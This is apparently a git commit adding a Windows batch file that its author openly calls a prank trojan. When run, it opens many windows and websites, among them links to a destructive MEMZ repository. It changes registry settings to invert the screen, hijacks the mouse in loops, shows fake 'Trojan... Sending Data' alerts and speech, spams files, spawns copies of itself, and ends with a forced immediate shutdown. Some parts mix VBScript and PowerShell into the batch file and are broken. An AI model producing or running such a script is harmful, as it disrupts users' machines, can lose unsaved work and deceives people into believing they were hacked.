09204c6a372a05d02757e21667e7e5c53e0b7182
tridev101 <J.michelle.whipkey@gmail.com>
2025-11-29 08:49:23 -0500

    triphospherpulluper.bat
    the main nonsafe file from me its garbage by the way and still considered a trojan so prob run this on a vm or so as virtual machine because when it opens up accessibility on windows do Win+Ctrl+C 2 times and then it will invert the screen. it opens up random websites it moves your mouse cursor it adds a trail to the cursor and inverts the screen so it doesnt destroy the computer tho and doesnt destroy the mbr. Thats everything hope you like it. This is my first repository.

---
+++ triphospherpulluper.bat
@@ -0,0 +1,473 @@
+@echo off
+powershell -command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('do you want to run this if you are not press the x on command prompt.? !','Hacked by triphospherpulluper.bat')"
+@echo off
+powershell -command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('you are sure i warned you last time if you wanna run it press ok if you do not press the x on the command prompt.?!','Hacked by triphospherpulluper.bat')"
+:loop
+$form = New-Object System.Windows.Forms.Form
+...
+$g.DrawRectangle(...)
+$g.DrawString(...)
+MsgBox("Virus Activated", ...)
+speechobject.speak "Your Computer is Hacked..."
+echo ts just new 
+echo pls close this i dont wanna get embarrassed im 6 years old evil-winrm
+start "" "notepad.exe"
+start "" "notepad.exe"
+start "" "notepad.exe"
+start "" "notepad.exe"
+start "" "Fluxus V7.exe"
+start "" "notepad.exe"
+start "" "youtube.com"
+start "" "youtube.com"
+start "" "cmd.exe"
+start "" "cmd.exe"
+start "" "taskmgr.exe"
+@echo off
+powershell -command ^
+"Add-Type -AssemblyName System.Drawing; " ^
+"Add-Type -AssemblyName System.Windows.Forms; " ^
+"$form = New-Object System.Windows.Forms.Form; " ^
+"$form.Width=400; $form.Height=200; $form.FormBorderStyle='None'; $form.TopMost=$true; $form.BackColor='Black'; $form.Opacity=0.5; " ^
+"$form.Show(); " ^
+"$g = $form.CreateGraphics(); " ^
+"$pen = New-Object System.Drawing.Pen([System.Drawing.Color]::Red,3); " ^
+"$g.DrawRectangle($pen,50,50,300,100); " ^
+"$font = New-Object System.Drawing.Font('Arial',24); " ^
+"$brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White); " ^
+"$g.DrawString('Hello GDI!', $font, $brush, 60, 80); " ^
+"Start-Sleep -Seconds 5; $form.Close()"
++
+echo hi wanna get dunked well lemme just pull up a google search!
+start "HH" "https://www.google.com/search?q=Your+are+hacked+by+Atomicyuki24+by+triphos.bat&sca_esv=6036db4e80af994f&rlz=1C1RXQR_enUS1125US1125&sxsrf=AE3TifNY5jKLZuj0B2du5crTAmVSz9nDuw%3A1764265120845&ei=oIwoac_nMc2cwbkPl_mu0A8&ved=0ahUKEwjPt8Pe75KRAxVNTjABHZe8C_oQ4dUDCBM&uact=5&oq=sprites+ifeis+wt++&gs_lp=Egxnd3Mtd2l6LXNlcnAiHHNwcml0ZXMgaWZlaXMgd2hvdHQgZ2l0dGh1YiAyBRAhGKABMgUQIRigATIFECEYoAEyBRAhGKABSNTgAVDOEFjs1gFwDHgBkAEDmAGqAaAB6yGqAQUyOS4xNbgBA8gBAPgBAZgCMqAC0B6oAhHCAgoQABhHGNYEGLADwgINEAAYgAQYigUYQxiwA8ICDhAAGOQCGNYEGLAD2AEBwgIZEC4YgAQYigUYQxjHARjRAxjIAxiwA9gBAcICFhAuGIAEGIoFGEMY1AIYyAMYsAPYAQHCAgcQIxixAhgnwgILEAAYgAQYigUYkQLCAgkQABiABBgKGAvCAg0QIxiABBiKBRjqAhgnwgIHECMY6gIYJ8ICFhAAGIAEGIoFGEMY5wYY6gIYtALYAQHCAh8QLhiABBiKBRhDGOcGGMcBGNEDGMgDGOoCGLQC2AEBwgIEECMYJ8ICChAjGIAEGIoFGCfCAgoQABiABBiKBRhDwgIREC4YgAQYsQMYgwEYxwEY0QPCAgsQABiABBixAxiDAcICBRAAGIAEwgILEC4YgAQYsQMYgwHCAhMQLhiABBiKBRhDGLEDGMcBGNEDwgIOEAAYgAQYigUYsQMYgwHCAhEQLhiABBixAxiDARjHARivAcICCBAAGIAEGLEDwgIEEAAYA8ICDhAuGIAEGIoFGLEDGIMBwgILEC4YgwEYsQMYgATCAgsQLhixAxiABBjlBMICGhAuGIMBGLEDGIAEGJcFGNwEGN4EGN8E2AEBwgIFEC4YgATCAggQLhiABBixA8ICCBAuGIAEGOUEwgIIEAAYFhgeGArCAgsQABiABBiKBRiGA8ICBRAAGO8FwgIIEAAYgAQYogTCAhAQLhiABBiKBRhDGMcBGNEDwgIQEAAYgAQYigUYQxixAxiDAcICFhAuGIAEGIoFGEMYsQMYgwEYxwEY0QPCAgsQLhiABBjHARjRA8ICDhAuGIAEGLEDGMcBGNEDwgIOEC4YxwEYsQMY0QMYgATCAhEQLhiDARjHARixAxjRAxiABMICEhAuGIAEGAoYCxixAxjHARjRA8ICDRAuGMcBGNEDGIAEGArCAgcQABiABBgKwgILEC4YgAQYxwEYrwHCAgcQABiABBgNwgIGEAAYHhgNwgIIEAAYHhgNGArCAgUQIRirAsICBRAhGJ8FwgIHECEYChigAZgDBOIDBRIBMSBAiAYBkAYTugYGCAEQARgJkgcFMzYuMTSgB8LoArIHBTI0LjE0uAekHsIHBzEuMjkuMjDIB3k&sclient=gws-wiz-serp"
+start "HH" /MAX "C:\batches\triphospherpulluper.bat"
+echo press y for yes if you want one more or n for no
+echo sike opening in 1 2 3
+start "" "https://www.google.com/search?q=get+hacked+lol&rlz=1C1RXQR_enUS1125US1125&oq=aponfly&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIRCAEQABgKGAsYgwEYsQMYgAQyCwgCEAAYChgLGIAEMgsIAxAAGAoYCxiABDILCAQQABgKGAsYgAQyCwgFEAAYChgLGIAEMgsIBhAAGAoYCxiABDIGCAcQRRg80gEIODYzMmowajeoAgCwAgA&sourceid=chrome&ie=UTF-8"
+echo imma pull up task manager
+start "" "taskmgr.exe"
+echo lets see if you like this
+echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+echo dnwsjsmasd
+echo sadnjasdnjsnj
+echo shbasjdsan
+echo sdjsnjsdajnd
+echo sjadsb
+echo ajsdnjs
+start "" "taskmgr.exe"
+start "" "https://www.google.com/search?q=aponfly&rlz=1C1RXQR_enUS1125US1125&oq=aponfly&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIRCAEQABgKGAsYgwEYsQMYgAQyCwgCEAAYChgLGIAEMgsIAxAAGAoYCxiABDILCAQQABgKGAsYgAQyCwgFEAAYChgLGIAEMgsIBhAAGAoYCxiABDIGCAcQRRg80gEIODYzMmowajeoAgCwAgA&sourceid=chrome&ie=UTF-8"
+start "" "https://www.google.com/search?q=Memz.exe-destructive&rlz=1C1RXQR_enUS1125US1125&oq=aponfly&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIRCAEQABgKGAsYgwEYsQMYgAQyCwgCEAAYChgLGIAEMgsIAxAAGAoYCxiABDILCAQQABgKGAsYgAQyCwgFEAAYChgLGIAEMgsIBhAAGAoYCxiABDIGCAcQRRg80gEIODYzMmowajeoAgCwAgA&sourceid=chrome&ie=UTF-8"
+echo now try to live bro
+start "" "https://www.youtube.com/@yowhatss"
+https://www.google.com/search?sca_esv=6036db4e80af994f&rlz=1C1RXQR_enUS1125US1125&sxsrf=AE3TifPz0PtzNr3dirER9u7SaaGtggQd2w:1764267722747&q=You+are+hacked+by+Atomic+Yuki24+by+triphos.bat&spell=1&sa=X&ved=2ahUKEwjgs5y3-ZKRAxUMSTABHTBaAWUQBSgAegQIDxAB&biw=1869&bih=947&dpr=1
+echo subscribe now
+echo wanna?
+echo here is some music dumb weirdo
+start "" "https://www.youtube.com/watch?v=8Tw5uIcrUkA&t=364s"
+@echo off
+powershell -command ^
+"$c = New-Object System.Windows.Forms.Cursor; " ^
+"Add-Type -AssemblyName System.Windows.Forms; " ^
+"for ($i=0;$i -lt 3;$i++){ " ^
+"   $form = New-Object System.Windows.Forms.Form; " ^
+"   $form.FormBorderStyle='None'; " ^
+"   $form.ShowInTaskbar=$false; " ^
+"   $form.BackColor='White'; " ^
+"   $form.Width=20; $form.Height=20; " ^
+"   $form.TopMost=$true; " ^
+"   $form.Add_Shown({ $form.Visible=$true }); " ^
+"   $forms += $form " ^
+"} " ^
+"while($true){ " ^
+"   $p=[System.Windows.Forms.Cursor]::Position; " ^
+"   $i=0; foreach($f in $forms){ " ^
+"       $f.Location = [Drawing.Point]::new($p.X + (20*($i+1)), $p.Y + (20*($i+1))); " ^
+"       $f.Refresh(); $i++; " ^
+"   } " ^
+"}"
+start "" "https://github.com/MARSHMALLLOW/MEMZDestructiveBatch"
+start "" "https://www.google.com/search?q=cowboys+chiefs&client=firefox-b-1-d&sca_esv=de84d0bdc7a8d963&sxsrf=AE3TifO9cDfA_WrNljLBLqG7_68F9a37Tg%3A1764282719531&ei=X9Eoab2dIIvHp84P_o7a0AI&ved=0ahUKEwj9yJ-msZORAxWL48kDHX6HFioQ4dUDCBM&uact=5&oq=cowboys+chiefs&gs_lp=Egxnd3Mtd2l6LXNlcnAiDmNvd2JveXMgY2hpZWZzMgoQABhHGNYEGLADMgoQABhHGNYEGLADMgoQABhHGNYEGLADMgoQABhHGNYEGLADMgoQABhHGNYEGLADMgoQABhHGNYEGLADMgoQABhHGNYEGLADMgoQABhHGNYEGLADMg0QABiABBiKBRhDGLADMg0QABiABBiKBRhDGLADMg0QABiABBiKBRhDGLADMg0QABiABBiKBRhDGLADMg4QABjkAhjWBBiwA9gBATIOEAAY5AIY1gQYsAPYAQEyDhAAGOQCGNYEGLAD2AEBMhMQLhiABBiKBRhDGMgDGLAD2AEBMhMQLhiABBiKBRhDGMgDGLAD2AEBMhMQLhiABBiKBRhDGMgDGLAD2AEBSIAFUABYAHABeAGQAQCYAQCgAQCqAQC4AQPIAQCYAgGgAgiYAwCIBgGQBhK6BgYIARABGAmSBwExoAcAsgcAuAcAwgcDMi0xyAcG&sclient=gws-wiz-serp"
+@echo off
+:: Toggle Windows color inversion
+
+powershell -command ^
+"Set-ItemProperty -Path 'HKCU:\Software\Microsoft\ColorFiltering' -Name Active -Value 1; " ^
+"Set-ItemProperty -Path 'HKCU:\Software\Microsoft\ColorFiltering' -Name FilterType -Value 1; " ^
+"Set-ItemProperty -Path 'HKCU:\Software\Microsoft\ColorFiltering' -Name HotkeyEnabled -Value 1;"
+
+:: Activate filter immediately
+powershell -command "Add-Type -AssemblyName System.Runtime.WindowsRuntime; " ^
+"[Windows.UI.ViewManagement.UISettings]::new().ColorFilterSettingsEnabled = \$true"
+@echo off
+powershell -command ^
+"Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' FilterType 4; " ^
+"Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' Active 1; " ^
+"Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' HotkeyEnabled 1"
+
+start ms-settings:easeofaccess-colorfilter
+@echo off
+powershell -command ^
+"Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' FilterType 1; " ^
+"Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' Active 1; " ^
+"Set-ItemProperty 'HKCU:\Software\Microsoft\ColorFiltering' HotkeyEnabled 1"
+
+start ms-settings:easeofaccess-colorfilter
+
+@echo off
+:loop
+
+REM Generate random X and Y positions (0–800)
+set /a x=%random% %% 800
+set /a y=%random% %% 600
+
+REM Move the mouse using PowerShell
+powershell -command ^
+"[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');" ^
+"[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(%x%,%y%)"
+
+timeout /t 1 >nul
+goto loop
+@echo off
+setlocal enabledelayedexpansion
+
+REM Offset amount (how far behind the trail it follows)
+set offsetX=20
+set offsetY=20
+
+:loop
+
+REM Get mouse position using PowerShell
+for /f "tokens=1,2 delims=," %%a in ('powershell -command ^
+    "Add-Type -AssemblyName System.Windows.Forms; $p=[System.Windows.Forms.Cursor]::Position; Write-Output ($p.X.ToString()+','+$p.Y.ToString())"'
+) do (
+    set mouseX=%%a
+    set mouseY=%%b
+)
+
+REM Calculate follower position
+set /a fx=mouseX - offsetX
+set /a fy=mouseY - offsetY
+
+REM Move the follower cursor
+powershell -command ^
+"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(%fx%,%fy%)"
+
+REM Speed of follow (lower = faster)
+timeout /t 0 >nul
+
+goto loop
+
+taskkill "chrome.exe"
+echo look i just wanted to close it out man
+echo !m &@nn@ *#eak havoc soon
+cls
+start "" "taskmgr.exe"
+@echo off
+powershell -command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('hey i am but message boxes around your screen!','Batch Message')"
+@echo off
+powershell -command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Yo you got hacked!','Hacked by triphospherpulluper.bat')"
+
+@echo off
+echo ESC[<row>;<column>H
+
+:: Move cursor to row 5, column 10
+echo [5;10HHello!
+start "" "https://github.com/MARSHMALLLOW/MEMZDestructiveBatch"
+powershell -command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(' why did you do this to yourself!','Hacked by triphospherpulluper.bat')"
+powershell -command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('hi you got a way!','Hacked by triphospherpulluper.bat')"
+echo [40m     :: black
+echo [41m     :: red
+echo [44mHello![0m
+start "" "ayy.vbs"
+@echo off
+setlocal enabledelayedexpansion
+
+REM Offset amount (how far behind the trail it follows)
+set offsetX=20
+set offsetY=20
+
+:loop
+
+REM Get mouse position using PowerShell
+for /f "tokens=1,2 delims=," %%a in ('powershell -command ^
+    "Add-Type -AssemblyName System.Windows.Forms; $p=[System.Windows.Forms.Cursor]::Position; Write-Output ($p.X.ToString()+','+$p.Y.ToString())"'
+) do (
+    set mouseX=%%a
+    set mouseY=%%b
+)
+
+REM Calculate follower position
+set /a fx=mouseX - offsetX
+set /a fy=mouseY - offsetY
+
+REM Move the follower cursor
+powershell -command ^
+"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(%fx%,%fy%)"
+
+REM Speed of follow (lower = faster)
+timeout /t 0 >nul
+
+goto loop
+
+X = MsgBox("Error while opening Music App. Do you want to fix it?",4+64,"Music")
+
+WScript.Sleep 5000
+
+X = MsgBox("Unable to fix this Error. Scanning This PC",0+48,"System Scan")
+
+WScript.Sleep 5000
+
+X = MsgBox("Alert! Virus detected while scanning This PC. Do you want to Scan Again?",4+16,"Alert")
+
+WScript.Sleep 2000
+
+X = MsgBox("Virus Activated",2+16,"Virus Alert")
+
+
+X = MsgBox("Your PC is attacked with Trojan. Sending Data...",2+64,"Trojan Horse")
+
+
+X = MsgBox("Your Computer is Hacked!!!",1+64,"Trojan Horse")
+
+set speechobject = createobject("sapi.spvoice")
+speechobject.speak "Your Computer is Hacked by the Trojan"
+speechobject.speak "Your Computer is Hacked by the Trojan"
+speechobject.speak "Your Computer is Hacked by the Trojan"
+speechobject.speak "Your Computer is Hacked by the Trojan"
+speechobject.speak "Your Computer is Hacked by the Trojan"
+
+WScript.Sleep 20
+
+
+set WshShell = Wscript.createObject("WScript.Shell")
+WshShell.Run "notepad"
+WScript.Sleep 10
+
+WshShell.AppActivate "notepad"
+WScript.Sleep 500
+WshShell.SendKeys "Hel"
+WScript.Sleep 500
+WshShell.SendKeys "lo"
+WScript.Sleep 500
+WshShell.SendKeys ", Ho"
+WScript.Sleep 500
+WshShell.SendKeys "w a"
+WScript.Sleep 500
+WshShell.SendKeys "re "
+WScript.Sleep 500
+WshShell.SendKeys "yo"
+WScript.Sleep 500
+WshShell.SendKeys "u? "
+WScript.Sleep 500
+WshShell.SendKeys "Th"
+WScript.Sleep 500
+WshShell.SendKeys "is "
+WScript.Sleep 500
+WshShell.SendKeys "com"
+WScript.Sleep 500
+WshShell.SendKeys "pu"
+WScript.Sleep 500
+WshShell.SendKeys "ter"
+WScript.Sleep 500
+WshShell.SendKeys " is"
+WScript.Sleep 500
+WshShell.SendKeys " no"
+WScript.Sleep 500
+WshShell.SendKeys "w"
+WScript.Sleep 500
+WshShell.SendKeys " ha"
+WScript.Sleep 500
+WshShell.SendKeys "ck"
+WScript.Sleep 500
+WshShell.SendKeys "ed!!"
+
+WScript.Sleep 30000
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo TEST > test.txt
+echo you just got hacked and got spammed files delete them i dare you to.
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+start Flash.bat
+mode 100,40
+
+:loop
+set /a bg=%random% %% 16
+set /a fg=%random% %% 16
+if %bg%==%fg% set /a fg=(fg+1) %% 16
+
+color %bg%%fg%
+cls
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+echo %random%%random%%random%%random%%random%%random%
+goto loop
+@echo off
+shutdown /s /f /t 0
+start "HH" "https://www.google.com/search?q=haccad+ifei+whopper+getsadyourhacked+&sca_esv=6036db4e80af994f&rlz=1C1RXQR_enUS1125US1125&sxsrf=AE3TifNY5jKLZuj0B2du5crTAmVSz9nDuw%3A1764265120845&ei=oIwoac_nMc2cwbkPl_mu0A8&ved=0ahUKEwjPt8Pe75KRAxVNTjABHZe8C_oQ4dUDCBM&uact=5&oq=sprites+ifeis+whott+gitthub+&gs_lp=Egxnd3Mtd2l6LXNlcnAiHHNwcml0ZXMgaWZlaXMgd2hvdHQgZ2l0dGh1YiAyBRAhGKABMgUQIRigATIFECEYoAEyBRAhGKABSNTgAVDOEFjs1gFwDHgBkAEDmAGqAaAB6yGqAQUyOS4xNbgBA8gBAPgBAZgCMqAC0B6oAhHCAgoQABhHGNYEGLADwgINEAAYgAQYigUYQxiwA8ICDhAAGOQCGNYEGLAD2AEBwgIZEC4YgAQYigUYQxjHARjRAxjIAxiwA9gBAcICFhAuGIAEGIoFGEMY1AIYyAMYsAPYAQHCAgcQIxixAhgnwgILEAAYgAQYigUYkQLCAgkQABiABBgKGAvCAg0QIxiABBiKBRjqAhgnwgIHECMY6gIYJ8ICFhAAGIAEGIoFGEMY5wYY6gIYtALYAQHCAh8QLhiABBiKBRhDGOcGGMcBGNEDGMgDGOoCGLQC2AEBwgIEECMYJ8ICChAjGIAEGIoFGCfCAgoQABiABBiKBRhDwgIREC4YgAQYsQMYgwEYxwEY0QPCAgsQABiABBixAxiDAcICBRAAGIAEwgILEC4YgAQYsQMYgwHCAhMQLhiABBiKBRhDGLEDGMcBGNEDwgIOEAAYgAQYigUYsQMYgwHCAhEQLhiABBixAxiDARjHARivAcICCBAAGIAEGLEDwgIEEAAYA8ICDhAuGIAEGIoFGLEDGIMBwgILEC4YgwEYsQMYgATCAgsQLhixAxiABBjlBMICGhAuGIMBGLEDGIAEGJcFGNwEGN4EGN8E2AEBwgIFEC4YgATCAggQLhiABBixA8ICCBAuGIAEGOUEwgIIEAAYFhgeGArCAgsQABiABBiKBRiGA8ICBRAAGO8FwgIIEAAYgAQYogTCAhAQLhiABBiKBRhDGMcBGNEDwgIQEAAYgAQYigUYQxixAxiDAcICFhAuGIAEGIoFGEMYsQMYgwEYxwEY0QPCAgsQLhiABBjHARjRA8ICDhAuGIAEGLEDGMcBGNEDwgIOEC4YxwEYsQMY0QMYgATCAhEQLhiDARjHARixAxjRAxiABMICEhAuGIAEGAoYCxixAxjHARjRA8ICDRAuGMcBGNEDGIAEGArCAgcQABiABBgKwgILEC4YgAQYxwEYrwHCAgcQABiABBgNwgIGEAAYHhgNwgIIEAAYHhgNGArCAgUQIRirAsICBRAhGJ8FwgIHECEYChigAZgDBOIDBRIBMSBAiAYBkAYTugYGCAEQARgJkgcFMzYuMTSgB8LoArIHBTI0LjE0uAekHsIHBzEuMjkuMjDIB3k&sclient=gws-wiz-serp
+
